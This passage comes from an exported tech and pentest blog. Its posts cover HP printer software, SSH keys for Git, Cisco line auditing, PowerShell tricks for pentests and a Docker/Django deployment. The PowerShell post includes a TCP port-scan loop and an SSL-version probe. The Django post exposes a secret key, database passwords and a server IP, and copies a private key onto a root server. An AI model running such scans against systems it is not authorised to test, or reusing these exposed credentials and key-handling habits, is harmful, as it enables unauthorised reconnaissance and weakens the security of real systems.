Features.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/986c94ed-1742-4c2f-8150-8eb11f8930f0.png\" class=\"img-fluid\" alt=\"Opening Apps and Features\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Opening Apps and Features.</figcaption>\n</figure>\n\nNow find and uninstall the HP Smart App\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/3cd82287-cef9-4b0a-b3b4-94e945767381.png\" class=\"img-fluid\" alt=\"Uninstall HP Smart App\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Uninstall HP Smart Apps.</figcaption>\n</figure>\n\n\n## Install New Software\n\nIn my case I have a HP Envy 4520 that sits at the end of my desk. I can go here and grab the [HP Envy 4520 Drivers](https://support.hp.com/gb-en/drivers/selfservice/closure/hp-envy-4520-all-in-one-printer-series/5447920)\n\nYes. Go to Windows 10 \"Apps and Features\" and uninstall the HP SMART APP then reboot your PC. Then go to HP Support web page for HP OfficeJet XXXX (put in for your specific model) then go to \"Software and Drivers\" and scroll down to \"Software-Utility\" and download \"HP OfficeJet XXXX series Print and Scan Driver and Accessories\" (164 MB in my case) and install that. Be sure to disable the litany of privacy check boxes in the first screen or two before the install begins (see the links). Voila. No more account requirement to scan."},{"fields":{"slug":"/app-wiz-cpl-vs-apps-and-features"},"excerpt":"Appwiz.cpl is a run command shortcut to open the Add/Remove Programs or Uninstall a Program list on Microsoft Windows XP, Vista, 7, 8, and…","frontmatter":{"date":"21st April 2021 ","title":"AppWiz.cpl vs Apps and Features","description":"","tags":null,"posttype":"blog"},"body":"\nAppwiz.cpl is a run command shortcut to open the Add/Remove Programs or Uninstall a Program list on Microsoft Windows XP, Vista, 7, 8, and 10. \n\nTo use the appwiz.cpl command on your computer, press the `Windows Key` + `R` on your keyboard at the same time. The Run Command window should come up.\n\nIn this box, type appwiz.cpl and click OK or press Enter on your keyboard.\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/346fd5bb-f993-4497-9036-da99fe9e1d76.png\" class=\"img-fluid\" alt=\"Running appwiz.cpl\" />\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Running appwiz.cpl.</figcaption>\n</figure>\n\n\n\nThis will open your list of currently installed programs on your computer where you can make selections to uninstall unwanted programs as needed.\n\nTo return to the uninstallation instructions you were at previous, scroll up or click the Go Back button at the top of the page.\n\n> Note, it has been mentioned by someone in the comments that they needed to go to \"Apps and Features\" in order to uninstall the program. The below instructions will take you through these steps.\n"},{"fields":{"slug":"/moving-around-the-terminal-like-a-boss-using-screen-for-linux"},"excerpt":"Installing Setting Name\nscreen -S <my scans>","frontmatter":{"date":"19th April 2021 ","title":"Moving Around The Terminal Like A Boss: Using Screen For Linux","description":"","tags":null,"posttype":"tutorial"},"body":"## Installing\n\n\n## Setting Name\n\n```\nscreen -S <my scans>\n```"},{"fields":{"slug":"/docker-down-again"},"excerpt":null,"frontmatter":{"date":"15th April 2021 ","title":"Docker Down Again","description":"","tags":"docker","posttype":"blog"},"body":"Well, I learnt my lesson from the other day. Seeing as I use Docker quite a bit I was surprised, to say the least, that I couldn't even pull a few basic packages down until I remembered to check on my old friend <a href=\"https://status.docker.com/\" target=\"_blank\" class=\"external\" title=\"External Link to docker.com\" rel=”nofollow”>https://status.docker.com/</a>\n\nI mean what was \"Error response from daemon: received unexpected HTTP status: 503 Service Unavailable\" supposed to mean when trying to run the hello-world example for confirmation of a successful Docker install. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/345dd538-9a56-4db8-9aa0-a567f07d1e92.png\" class=\"img-fluid\" alt=\"Trying to pull down a few basic images and being met with 503 errors\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Trying to pull down a few basic images and being met with 503 errors</figcaption>\n</figure>\n\nAnnoying yes! but knowing it is not something I have done makes me feel a little better. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/e9218761-2274-4d78-96dc-ff9dabe89c64.png\" class=\"img-fluid\" alt=\"Docker System Status real-time view confirming the error.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Docker System Status real-time view confirming the error.</figcaption>\n</figure>"},{"fields":{"slug":"/git-with-ssh-keys"},"excerpt":null,"frontmatter":{"date":"15th April 2021 ","title":"Git with SSH Keys","description":"When working with Git via command line, the easiest way to authenticate is with x.509 keys. This article will show you how to set them up.","tags":"git, github, github-desktop, source-tree, ssh-keys, x509","posttype":"article"},"body":"\nWhen working with Git via command line, the easiest way to authenticate is with x.509 keys. This article will show you how to set them up. \n\n## Introduction \n\nWith GUI-based Git clients, such as GitHub Desktop and SourceTree, authentication is managed by the applications themselves with little to no user input required.\n\nHowever, sometimes you may want to use the power of the command line, in which case it is useful to have SSH keys set up.\n\n## SSH Key Location\n\nSSH keys are stored at the following locations depending on the operating system and/or the user.\n\nOn Linux - assuming you are not using the root user ;-)\n```\n/home/<user>/.ssh \n```\nor \n\nRoot user\n```\n/root/.ssh\n```\n\nBoth of these can be shortened using the tilde `~`, which is a shortcut for home. You can use tilde with many commands to save you from typing the full path. For example, you could have `cd ~` that would take you to your home directory. The two commands mentioned above could be shortened to the following.\n```\n~/.ssh\n```\n\nOn Windows, the typical location for SSH keys is\n```\nC:\\User\\<username>\\.ssh\n```\n\n## Listing Keys\n\nNow that we have learned where the SSH keys are stored on our system let us look at how we can list the contents of this folder.\n\nLinux\n```\nls -l ~/.ssh\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/media/markdown/2021/03/28/12eb72b9-f324-4f50-a9f9-0aa5bac57858.png\" class=\"img-fluid\" alt=\"Git with SSH Keys\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Git with SSH Keys.</figcaption>\n</figure>\n\nWindows CMD\n```\ndir c:\\users\\<username>\\.ssh\n```\n\n<img src=\"/media/markdown/2021/03/28/9b4a3962-ecf6-4b7b-ae7f-36bbe5ddec07.png\" class=\"img-fluid\" alt=\"untitled\">\n\nWindows PowerShell\n```\nGet-ChildItem C:\\Users\\<username>\\.ssh\n```\n\n<img src=\"/media/markdown/2021/03/28/181e4ae6-5cb4-4d22-9119-fdbddee95beb.png\" class=\"img-fluid\" alt=\"untitled\">\n\n> **Note** It is quite common to have multiple keys in this folder as keys can be used for many things other than Git. \n\n## Existing SSH keys\n\nIf you are learning about SSH keys and using them to authenticate to Git Repositories for the first time, the above folders likely are empty on your system. In this case, please take a look at the screenshots above. You will notice that the keys are named in pairs; one key ends in the `.pub` extension, and the other has no extension at all. \n\nThe file ending in `.pub` contains the public key, while the other file contains the private key. The private key should never be shared anywhere. If you lose your private key, you will need to regenerate a new private/public key pair, as authentication cannot be successfully completed without both parts. \n\nIt should be noted that you can regenerate a public key with just the private key; however, you cannot generate a new private key from a public key. \n\n## Generating Your First SSH Key-pair\n\nTo generate a brand new key pair, you can use the SSH keygen command `ssh-keygen`, which is available on most versions of *nix, Mac OS, and Windows with either the Windows Subsystem for Linux (WSL) or the Git Windows Desktop package. \n\n\nHere's the command you want to use\n```\nssh-keygen -t rsa -b 4096 -C \"<comment>\"\n```\n| Option     | Description                              |\n|------------|------------------------------------------|\n| -t type    | The type option states the type of encryption to use. The possible values are \"dsa\", \"ecdsa\" or \"rsa\". Please note this is RSA version 2; for RSA version 1, you need to change this to \"rsa1\". |\n| -b bits    | This option specifies the number of bits in the key to create.  For RSA keys, I like to use 4096 bits, the default is 2048, and the minimum is 768 bits. When working with DSA keys, it is important to note that the DSA keys must be exactly 1024 bits. For ECDSA keys, the -b flag determines the key length by selecting from one of three elliptic curve sizes: 256, 384 or 521 bits.  Attempting to use bit lengths other than these three values for ECDSA keys will fail. |\n| -C comment | Allows for a comment to be added to the public key |\n\n\n> **Note** The comment field is typically filled in with the key owner's email address, but it can actually be anything you want it to be. You could enter a random string or a note about the client device or service being used. It is, however, recommended that you do not enter vague or unclear content in this space and instead use something that will allow you to identify the owner/purpose of the keys years down the road. \n\nAfter we have decided on a specific type, bits, and comment text, we are ready to generate our keys. Upon typing the command and hitting enter, the first thing you will be asked is where you would like to store the newly generated keys. Typically, you are advised to store the keys in one of the default locations, which we looked at earlier with the suggested id_<type> key name. Examples include id_rsa, id_dsa, and id_ecdsa. Personally, I prefer to name my keys with something a little more memorable. If you look at the screenshots above, you will see that I like to use distinctive key names, such as `github_rsa`.\n\nNext, you will be asked if you would like to add a passphrase. The purpose of the passphrase is to encrypt your private key. Encrypting the private key makes the file useless in case the key is compromised. It is not unusual for computers to be lost or stolen or for old hardware to be decommissioned without the hard disc being wiped.  \n\nThe passphrase is needed to use the encrypted key. Some less security-conscious users often state not seeing the point of using SSH keys when they will still have to type in their authentication credentials each time, and as a result, will often leave the passphrase blank. This is the wrong way of looking at the purpose of SSH keys. The passphrase acts as a separate factor of authentication. Keep in mind that it is much more difficult to brute-force an SSH key than it is a password; however, on its own, the key may be vulnerable to theft, and so the password is its last line of defence. \n\n## Adding SSH Keys to Git\n\nAs shown in the pictures below, setting up Git to work with SSH keys is a similar process on Github and Gitlab. \n\n**Gitlab**\n\nFirst, let us look at Gitlab. \n\n\nClick on the profile icon in the top right, and a drop-down menu will appear. Select the menu item \"Settings\". \n\n<img src=\"/media/markdown/2021/03/28/6661bfce-eff2-48e2-b6fc-b1b7e1c78d4a.png\" class=\"img-fluid\" alt=\"untitled\">\n\nAnother menu should be located on the left-hand side of the settings page. On it, click on the \"SSH Keys\" option.\n\n<img src=\"/media/markdown/2021/03/28/717dc1cb-dcee-4a0f-bbec-c77dbf41a46c.png\" class=\"img-fluid\" alt=\"untitled\">\n\nYou will be presented with an input box to paste your public key (the one that ends in `.pub`). Paste your key into the input box and give your key a title that will allow you to recall the device or user that will be authenticated. Make sure that this is something you will remember years down the road, as it can be difficult to debug over time if you are left to analyse an ambiguous clue. Finally, you can submit an expiry date which is useful if you have third party developers or contractors working in your repository. \n\n<img src=\"/media/markdown/2021/03/28/1ed759c3-ff88-4f51-812e-d3871577f2d0.png\" class=\"img-fluid\" alt=\"untitled\">\n\n**GitHub**\n\nAs we will see, Github follows a similar process to that of adding SSH keys to Gitlab, albeit with an extra step. \n\nClick on the profile icon in the top right corner, and a drop-down menu will appear. Select the menu item \"Settings\". \n\n<img src=\"/media/markdown/2021/03/28/a4f73a87-15e2-44e5-93ab-c099f8b9ad7d.png\" class=\"img-fluid\" alt=\"untitled\">\n\nA menu should be located on the left-hand side of the settings page. Click on the \"SSH and GPG Keys\" option.\n\n<img src=\"/media/markdown/2021/03/28/1afb1f1b-5850-4a96-b614-2fba14eaca42.png\" class=\"img-fluid\" alt=\"untitled\">\n\nAt this point of the Gitlab setup, we would be presented with an input field to paste our SSH key into, below which would be a list of all our existing keys. With Github, however, we are presented with a list of our existing keys and a green button that says \"New SSH Key\". Click on this button, and you will be presented with an input box similar to that provided on Gitlab. \n\n<img src=\"/media/markdown/2021/03/28/2aa08fdb-7de5-4118-b643-3df041128996.png\" class=\"img-fluid\" alt=\"untitled\">\n\nAn input box to paste your public key (the one that ends in `.pub`) will be presented to you. Paste your key into the input box and give your key a title that will allow you to recall the device or user that will be authenticated. Make sure that this is something you will remember years down the road, as it can be difficult to debug over time if you are left to analyse an ambiguous clue. Unlike Gitlab, Github does not allow you to set a key that expires. \n\n<img src=\"/media/markdown/2021/03/28/310ea5bf-0523-4254-8483-69c5b0459291.png\" class=\"img-fluid\" alt=\"untitled\">\n\n## Using multiple keys\n\nAs I mentioned at the beginning of this article, you may have multiple SSH keys on your system. In fact, I prefer to create a new SSH keypair for each service. \n\nWhy?\n\nIf a keypair becomes compromised, it is much easier to regenerate one keypair than it is to change it in multiple locations. \n\nIt is recommended that you use a different SSH key for every service you intend to use. This makes it very easy to invalidate a key on a specific service without having to change it on all the services, should you decide to renew it either because it has been compromised / publicly exposed or for any other reason."},{"fields":{"slug":"/auditing-cisco-network-devices"},"excerpt":"Look out for device administrative (console and aux) lines that are configured without a password. An attacker with physical access to the…","frontmatter":{"date":"15th April 2021 ","title":"Auditing Cisco Network Devices","description":"","tags":null,"posttype":"article"},"body":"\n# Administrative Line Login With No Password\n\nLook out for device administrative (console and aux) lines that are configured without a password. An attacker with physical access to the ports, or with remote modem access, would be able to access the host. Any access could lead to system compromise, packet sniffing, or denial of service.\n\nEnsure that authentication is configured on all ports. Shut down any ports that are not in use.\nThe authentication mechanism and authentication password can be configured on administrative lines using the following line mode commands:\n```\nlogin [tacacs | local]\npassword password\n```"},{"fields":{"slug":"/5-uses-for-power-shell-on-pentests"},"excerpt":null,"frontmatter":{"date":"15th April 2021 ","title":"5 Uses for PowerShell on Pentests","description":"Five ways of using PowerShell on your pentests.","tags":"powershell","posttype":"article"},"body":"## 1, Checking for duplicate files\n\nFinding duplicate files can be a tricky task, especially when you have 100's of files spread all over your hard drive.  An easy way is to compute the checksum of the files you would like to check and compare them. If we generate checksums for two files, we can declare that the two files aren’t duplicates if the checksums are different. If the checksums are equal, we can claim that the files are identical, considering that getting the same hash for two different files is almost impossible.\n\nCollisions can occur with Sha1 and MD5, so it is recommended you either double-check with both algorithms (as a collision on both will be unlikely) or use an algorithm such as Sha512.\n\nWe can use the following function to get the checksum of any file. \n\n```powershell\nGet-FileHash -Algorithm sha1 file.txt\n```\n\nThe `Get-FileHash` algorithm attribute supports the following:\n\n- SHA1 (160 bits)\n- SHA256 (256 bits)\n- SHA384 (384 bits)\n- SHA512 (512 bits)\n- MACTripleDES (64 bits)\n- MD5 (128 bits)\n- RIPEMD160 (160 bits)\n\n<img src=\"/static/ea89c0fc-5aea-4f88-9257-4ca0e3121921.png\" class=\"img-fluid\" alt=\"untitled\">\n\n\n## 2 Create ISO files\n\n### What are ISO files?\n\nISOs are a type of archive. The easiest way to think of an ISO file is more like a .zip or .cab archive file, only without the compression. An ISO file contains the image of a disk. That means it contains all the files and folders on that disk, much like a .zip or .cab file containing a collection of files and folders.\n\n### What are some of the benefits of ISO files.\n\n- Chances of getting viruses in your file are reduced.\n- Chances of your data being corrupt are reduced after creating an ISO file.\n- A single ISO file can hold a whole batch of files and tools.\n\nUsing the code, we can find it at the following location. We can create an ISO file for storing tools and documents inside and mounting them inside our virtual machines. \n\n[New-ISOFile function](https://gallery.technet.microsoft.com/scriptcenter/New-ISOFile-function-a8deeffd)\n\nTo make the script easier to call, we will put it in our profile. See the following link for more information about PowerShell profiles and the appropriate location.\n\n[https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.1#the-profile-files](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.1#the-profile-files)\n\n```powershell\nNew-Item -ItemType Directory $Home\\Documents\\PowerShell\\\nNew-Item $Home\\Documents\\PowerShell\\Profile.ps1\nnotepad $Home\\Documents\\PowerShell\\Profile.ps1\n```\n\n<img src=\"/static/b997e7f9-e47c-4b85-8ca3-7973dd4dd150.png\" class=\"img-fluid\" alt=\"untitled\">\n\nWith the function saved in our profile, we can now create an ISO. Let us use the text files we created earlier. \n\n```powershell\ngci * | New-ISOFile -Path textfile.iso\n```\n\n<img src=\"/static/099f6a05-4dd0-48b1-93ef-f7f18d4987d3.png\" class=\"img-fluid\" alt=\"untitled\">\n\nLets now mount the disk and boot up our VM\n\n<img src=\"/static/a1907569-7cbb-4654-8c61-749523497c25.png\" class=\"img-fluid\" alt=\"untitled\">\n\nSetting the CD player path to the path of the ISO we just created. \n\n<img src=\"/static/98a87e5c-8ad8-452d-bd90-31f5e01e3f37.png\" class=\"img-fluid\" alt=\"untitled\">\n\n\nThe drive has appeared and seems to have content in it.\n\nLet's hit `Ctrl` + `E` to open up Explorer and navigate our mounted ISO.\n\n<img src=\"/static/24ba6ce8-449c-4c35-ad9f-ebcb72de8954.png\" class=\"img-fluid\" alt=\"untitled\">\n\nOut ISO contains the three files from earlier. \n\n## 3, Using PowerShell to Show Server Response Headers\n\nUsing the `Invoke-WebRequest` or the valid and shortened `iwr`, we can retrieve interesting information. \n\nThe returned object from `Invoke-WebRequest` will allow you to see items such as the returned HTTP status code, the links on a page, the forms on the page and the returned server headers. \n\n```powershell\n$request = Invoke-WebRequest https://evilsaint.co.uk\n$request.StatusCode\n$request.Headers\n$request.RawContent > temp.html\n```\n\nWhat these Headers mean I will leave for a future article, but here is a useful reference in the mean-time:\n\n[The HTTP Response Headers List](https://flaviocopes.com/http-response-headers/)\n\n<img src=\"/static/aee90e1c-ba46-4a56-920d-9b57a75268a8.png\" class=\"img-fluid\" alt=\"untitled\">\n\nHere we can see the headers returned by the server when making a GET request to [evilsaint.com](evilsaint.com)\n\n## 4, Checking what versions of SSL/TLS the server will support\n\n```powershell\n“ssl2”, “ssl3”, “tls”, “tls11”, “tls12” | % {\n\n    $TcpClient = New-Object Net.Sockets.TcpClient\n    $TcpClient.Connect(\"evilsaint.com\", 443)\n    try {\n        $SslStream = New-Object Net.Security.SslStream $TcpClient.GetStream()\n        $SslStream.ReadTimeout = 15000\n        $SslStream.WriteTimeout = 15000\n        $SslStream.AuthenticateAsClient(\"evilsaint.com\",$null,$_,$false)\n        $KeyExhange = $SslStream.KeyExchangeAlgorithm\n        $HashAlgorithm = $SslStream.HashAlgorithm\n        $status = $true\n\n    } catch {\n        $status = $false\n    }\n\n    $TcpClient.Dispose()\n    $SslStream.Dispose()\n\n    Write-Host \"$_ = $status\"\n    #Write-Host $KeyExhange\n    #Write-Host $HashAlgorithm\n}\n```\n<img src=\"/static/ee1e0133-5cee-4894-9031-35565478119d.png\" class=\"img-fluid\" alt=\"untitled\">\n\nHere we can see that [evilsaint.com](http://evilsaint.com) does not support SSL version 2 or 3\n\n## 5, Alive Hosts And Open Port Detection\n\nWhile ideally, we would always have tools such as Nmap, Masscan and Hping3 to hand, sometimes, we just had to live-of-the-land. \n\nTo see if a host is alive, we can use `Test-NetConnection` to send an ICMP ping request. \n\n```powershell\nTest-NetConnection evilsaint.com\n```\n\nIf we specify a port, then PowerShell will attempt a TCP connect test to that port.\n\n```powershell\nTest-NetConnection [evilsaint.com](http://evilsaint.com/) -Port 443\n```\n\nWith a little scripting, we can use the Net Sockets TCP Client and loop through many ports like so\n\n```powershell\n1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"[evilsaint.com](http://evilsaint.com/)\",$*)) \"Port $* is open!\"} 2>$null\n```\n\nThis can be quite a slow process.\n\n<img src=\"/static/ca18b1d9-c600-48ae-9082-fd3ecbb01b35.png\" class=\"img-fluid\" alt=\"untitled\">\n\n\nHere we can see Port 22 has been left open :-)"},{"fields":{"slug":"/docker-django-application"},"excerpt":null,"frontmatter":{"date":"15th April 2021 ","title":"Docker Django Application","description":"","tags":"docker, django","posttype":"tutorial"},"body":"```\nssh-copy-id -n root@192.248.158.136\n```\n\nThe `-n` is for a dry run. \n\nThis will copy the public key allowing us to connect to the server with our private key.\n```\nssh-copy-id root@192.248.158.136\n```\n\nHowever we need our private key on the box to talk to the private github reppo.\n\n```\nscp id_rsa root@192.248.158.136:/root/.ssh/\n```\n\n\nMake a directory in the traditional location \n\n```\nmkdir -p /var/www\n```\n\nPull across blank repo\n```\ngit clone git@github.com:cleverberry/docker-django-evilsaint.com.git  /var/www/django\n```\n\nI am not going to pull across the existing project as I will need to files as I convert this. \n\n```\nroot@docker-django-evilsaint:~# cd /tmp/\nroot@docker-django-evilsaint:/tmp# git clone git@github.com:cleverberry/django-evilsaint.com\n```\n\n\n```\n:::docker\n# pull the official base image\nFROM python:3.8.3-alpine\n\n# set work directory\nWORKDIR /usr/src/django-app\n\n# set environment variables\nENV PYTHONDONTWRITEBYTECODE 1\nENV PYTHONUNBUFFERED 1\n\n# install dependencies\nRUN pip install --upgrade pip\nCOPY ./requirements.txt .\nRUN pip install -r requirements.txt\n\n# copy project\nCOPY . .\n```\n\n\nSo, we started with an Alpine-based Docker image for Python 3.8.3. We then set a working directory along with two environment variables:\n\n> PYTHONDONTWRITEBYTECODE: Prevents Python from writing `pyc` files to disc (equivalent to python -B option)\n\n> PYTHONUNBUFFERED: Prevents Python from buffering stdout and stderr (equivalent to python -u option)\n\n\n\nNext I want to create a directory for me to put my app files into. \n```\nmkdir /usr/src/django-app\ncp /tmp/django-evilsaint.com/app /usr/src/django-app\n```\n\nLet's go back to our project root and have a look at what we have. \n\n\n<img src=\"/static/7d849d04-b590-4c8f-af96-0ee0a2ac856c.png\" class=\"img-fluid\" alt=\"\">\n\n\nNext, we need to add a docker-compose.yml file to the project root:\n\n<img src=\"/static/d5b1bbdb-a07e-41e2-b771-f32f8edbb513.png\" class=\"img-fluid\" alt=\"\">\n\n\n```\n:::python hc 8\nversion: '3.7'\n\nservices:\n  web:\n    build: ./app\n    command: python manage.py runserver 0.0.0.0:8000\n    volumes:\n      - ./app/:/usr/src/django-app/\n    ports:\n      - 8000:8000\n    env_file:\n      - ./.env\n````\n\n\nWe have created a volume as per the Django app directory we created earlier. This is where we will dump our app source\n```\n- ./app/:/usr/src/django-app/\n```\n\nNext we have specified an environmental file\n```\n-./.env\n```\n\nHere is what I have placed in mine\n```\nDEBUG=True\nSECRET_KEY=sdiofujsdioaaiWfjRsdTlHjriloarejtiop9dfjuaopjkfiopsdhujZfopieqriarosdXhfpAAsaofkcikoSaSshfgopiswujrfopsdhjiuagTUOphtsudjfiLGHNFohiqeprtghejrfds\nDJANGO_ALLOWED_HOSTS=localhost 127.0.0.1 [::1]\nSQL_ENGINE=django.db.backends.postgresql_psycopg2\nSQL_DATABASE=the_evilsaint_com_034998jer903203ksldjsl\nSQL_USER=mysaint\nSQL_PASSWORD=iloveyou_abc123_princess_princess\nSQL_HOST=localhost\nSQL_PORT=5432\n```\n\nSo now we reference these in the settings and fill in some defaults\n\nEdit the settings file inside this path\n```\nnano /usr/src/django-app/\n```\n\nThis will become your database block\n```\nDATABASES = {\n    \"default\": {\n        \"ENGINE\": os.environ.get(\"SQL_ENGINE\", \"django.db.backends.sqlite3\"),\n        \"NAME\": os.environ.get(\"SQL_DATABASE\", os.path.join(BASE_DIR, \"db.sqlite3\")),\n        \"USER\": os.environ.get(\"SQL_USER\", \"evilsaint\"),\n        \"PASSWORD\": os.environ.get(\"SQL_PASSWORD\", \"!5_V3ry_53cur3\"),\n        \"HOST\": os.environ.get(\"SQL_HOST\", \"localhost\"),\n        \"PORT\": os.environ.get(\"SQL_PORT\", \"5432\"),\n    }\n}\n```\n\nSee how these are used for the remaining variables. \n\n<img src=\"/static/dfc07527-77c2-430b-ab01-e5c2e4c2c06c.png\" class=\"img-fluid\" alt=\"\">\n\nUsing the psycopg2 package we need to add some dependencies to our docker file. \n\n```\n# install psycopg2 dependencies\nRUN apk update \\\n    && apk add postgresql-dev gcc python3-dev musl-dev\n```\n\n\n## Update Composer With Database, Gunicorn, Nginx"},{"fields":{"slug":"/rename-a-vmdk-disk-and-associated-files-with-v-mware-virtual-disk-manager"},"excerpt":null,"frontmatter":{"date":"15th April 2021 ","title":"Rename a VMDK disk and associated files with VMware Virtual Disk Manager","description":"","tags":"vmdk, vmware, windows","posttype":"tutorial"},"body":"I have a template Kali Linux Virtual Machine that I keep around in case in case of an unfixable error on my current engagement machine. The filenames inside this folder are quite verbose and are intentional to remind me what platform and version it is come to using the backup. This is fine for keeping backups but due to my OCD, I like to rename my engagement machines. Inside the below explorer window it can look quite daunting seeing all the verbose filenames associated with the machine; many consultants do not attempt to rename their machines in fear of messing them up. After all the machine has many associated files we need to rename. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/2d42660e-1b6f-4ccb-a499-b4ea35c8ad7e.png\" class=\"img-fluid\" alt=\"Explorer Windows Showing our Existing Machine.\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Explorer Windows Showing our Existing Machine.</figcaption>\n</figure>\n\nThe VMware Virtual Disk Manager is a tool that is included with VMware Workstation. \n\n> TLDR - What we are about to do is make a new machine with the exact naming convention and filesystem we want. We will then delete its hard disk drive and using the VMware Virtual Disk Manager tool included with VMware Workstation we will rename (and move) the old disk from the template to match. \n\n> NB - I said we will be renaming and moving the hard disk drive so if you would like to use this baseline in the future then I suggest it is something you keep additional copies of. \n\n\nIt is typically installed into the following folder:\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/02a92320-760d-4845-916a-e4edc0ab6fdf.png\" class=\"img-fluid\" alt=\"Explorer window of our old vmware machine with unfriendly name\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Explorer window of our old vmware machine with unfriendly name.</figcaption>\n</figure>\n\n\nThis folder contains lots of files. Check for the presence of the VMware Disk Manager tools by using a wildcard character following some of the initial prefix e.g.  `dir vmware*`\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/6be777e4-da34-4b67-9528-367bbffcd5cb.png\" class=\"img-fluid\" alt=\"cmd prompt set that the location of 'vmware workstation`\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">cmd prompt set that the location of 'vmware workstation`.</figcaption>\n</figure>\n\n\n\nGreat so the tools are present. We want to rename our VMware Virtual Machine contained in the following folder. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/2a5184cd-9612-41a4-bee7-12ba20938960.png\" class=\"img-fluid\" alt=\"cmd promp with the `dir vmware*` showing all files begining with vmware\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">cmd promp with the `dir vmware*` showing all files begining with vmware`.</figcaption>\n</figure>\n\n\nAs I do not need the VM Image to function from inside VM Workstation I am going to remove the image. Note this does not delete it from the disk. \n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/a254b426-3829-407b-8d4c-f7a71bb0ba91.png\" class=\"img-fluid\" alt=\"Explorer title bar navigated to the directory of the machine we are going to be cleaning\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Explorer title bar navigated to the directory of the machine we are going to be cleaning.</figcaption>\n</figure>\n\nNext, I am going to install a new VM in a directory with the desired name in my desired location. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/0dd01745-5d59-4429-8564-dcc8d3cb1ebf.png\" class=\"img-fluid\" alt=\"New Virtual Machine Wizard\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">New Virtual Machine Wizard.</figcaption>\n</figure>\n\nWhen asked choose \"I will install the operating system later.\"\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/0d7e254f-af24-47cd-be8f-08eedb7aeaaa.png\" class=\"img-fluid\" alt=\"I will install the operating system later.\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">I will install the operating system later.</figcaption>\n</figure>\n\nSet this new VM in your desired location and choose the name you wish for your VM\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/d269f440-83d2-413a-a1d5-b50e8ab33fef.png\" class=\"img-fluid\" alt=\"Naming the machine BlackWidow through the New Virtual Machine Wizard\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Naming the machine BlackWidow through the New Virtual Machine Wizard.</figcaption>\n</figure>\n\n\nBefore finishing I like to customise the machine's hardware. For this machine, I am going to perform the following\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/a9e02412-2cbe-473a-8cab-b30e69d5a07d.png\" class=\"img-fluid\" alt=\"New Virtual Machine Wizard - Customise Options\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">New Virtual Machine Wizard - Customise Options.</figcaption>\n</figure>\n\n\n* Remove Printer\n* Remove Sound Card\n* Increase memory to 8GB\n* Go to \"Display\" and select \"Accelerate 3d Graphics\". Then change the Graphics memory to 1GB. \n* Under the CPU I will select the following checkboxes. \n  * Virutalize Intel VT-x/EPT or AMD-V/RVI\n  * Virtualize CPU Performance Counters\n  * Virtualize IOMMU (IO memory management unit)\n\n\nWith our machine installed our first job is to delete the brand new created virtual disk. \n\nEither go to the `Settings` or press CTRL` + `D` and remove the hardisk\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/8a3dd6b1-6db2-48ba-9dd6-cccf8e6586b6.png\" class=\"img-fluid\" alt=\"Remove Hardrive from machine settings\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Remove Hardrive from machine settings.</figcaption>\n</figure>\n\nNow lets remove the harddrive from the physical disk. Remember the quick way to get to the folder is to right-click on the machine name and select \"Open VM directory\". With the folder open we can now see our new VM and all of its files. Open up the Virtual Machine by right clicking on it similar to earlier\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/05d4c2f1-4f1b-4093-b9a4-4a28d1de2c2a.png\" class=\"img-fluid\" alt=\"Open VM Directory of new BlackWidow Machine\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Open VM Directory of new BlackWidow Machine.</figcaption>\n</figure>\n\n\nRemove the Hard disk, the file ending in `vmdk` from the folder. VM in workstation. \n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/4abdd554-77f8-4e9c-aaad-1ce982df7ff7.png\" class=\"img-fluid\" alt=\"Remove the BlackWidows.vmdk file from explorer\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Remove the BlackWidows.vmdk file from explorer.</figcaption>\n</figure>\n\n\nDelete the file from the hard drive \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img 